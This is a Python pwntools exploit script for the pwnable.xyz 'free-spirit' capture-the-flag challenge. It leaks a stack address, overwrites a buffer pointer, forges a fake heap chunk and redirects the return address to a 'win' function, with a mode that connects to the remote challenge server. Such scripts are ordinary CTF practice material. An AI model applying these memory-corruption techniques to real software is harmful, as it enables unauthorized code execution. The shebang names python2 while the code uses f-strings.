#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
import time
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/ctf/ctfs/train/pwnable.xyz/free-spirit/image/challenge/challenge")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def free_exit():
    r.sendline("0")

def allocate(buf):
    time.sleep(0.5)
    r.sendline("1")
    time.sleep(0.5)
    r.send(buf)

def leak_ptr():
    r.sendlineafter(">","2")
    return int(r.recvline(),16)

def save():
    time.sleep(0.5)
    r.recvuntil(">")
    time.sleep(0.5)
    r.sendline("3")
    # r.sendline("7")

def exploit(r):
    attach(r)
    leak = leak_ptr()
    win = elf.sym['win']
    log.info(f"leak: " + hex(leak))
    ret = 0x0000000000400746
    bss = 0x601038

    # offset from the leaked stack address to return address
    offset_ret_addr = 0x48
    ret_addr = leak + offset_ret_addr
    log.info(f"ret address: " + hex(ret_addr))

    # point buf to ret address
    allocate(b"A" * 8 + p64(ret_addr) + b"X" * 16)  
    
    # pointer overwrite
    save()

    # overwrite main func with ret address to decrement the stack and must be aligned
    align = 16
    fake_chunk_addr = (leak - 0x2000) & (~(align -1))
    log.info(f"fake_chunk_addr: " + hex(fake_chunk_addr))
    fake_chunk_hdr = fake_chunk_addr-0x10-16
    log.info(f"move buffer to : " + hex(fake_chunk_hdr))
    p = b"A" * 8
    p += p64(fake_chunk_hdr)
    p += p64(ret)
    p += p64(win)
    allocate(p)

    # pointer overwrite
    save()

    # write 0x51 as the fake chunk size. this will match with the malloc'ed size and set prev_inuse bit to avoid having to 
    # deal with the prev chunk size field
    chunk_size = 0x51
    p = b"A" *8
    p += p64(fake_chunk_addr) 
    p += b"K" * 8
    p += p64(chunk_size)
    allocate(p)
    
    # pointer overwrite
    save()




    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("svc.pwnable.xyz", 30005)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
